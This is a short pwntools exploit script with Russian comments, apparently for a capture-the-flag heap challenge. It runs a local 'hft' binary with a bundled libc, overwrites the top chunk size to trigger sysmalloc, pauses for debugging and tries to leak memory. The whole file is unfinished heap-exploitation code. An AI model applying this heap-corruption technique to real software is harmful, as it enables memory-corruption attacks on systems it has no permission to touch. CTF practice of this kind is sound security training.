#!/usr/bin/env python3
from pwn import *

# Запускаем локально с нашим libc
context.binary = elf = ELF("./hft")
libc = ELF("./libc.so.6")
io = process([elf.path], env={"LD_PRELOAD": "./libc.so.6"})

def send_echo(content, sz):
    io.recvuntil(b"PKT_RES")
    io.send(p64(sz))
    payload = p64(1) + content
    io.sendline(payload)

log.info("Шаг 1: Базовая аллокация...")
send_echo(b"", 0x10)

log.info("Шаг 2: Перезапись размера Top Chunk...")
# Попробуем разные значения, если это не сработает
send_echo(b"a"*8 + p64(0xd31), 0x10)

log.info("Шаг 3: Триггерим sysmalloc...")
send_echo(b"B"*0xf00, 0x1000)

log.info("Остановка для отладки...")
pause() # Пауза, чтобы подключить gdb или pwndbg

# Пробуем получить утечку
log.info("Шаг 4: Утечка...")
send_echo(b"A"*7, 0x8) 
res = io.recvall(timeout=2)
log.info(f"Ответ: {res}")

io.close()
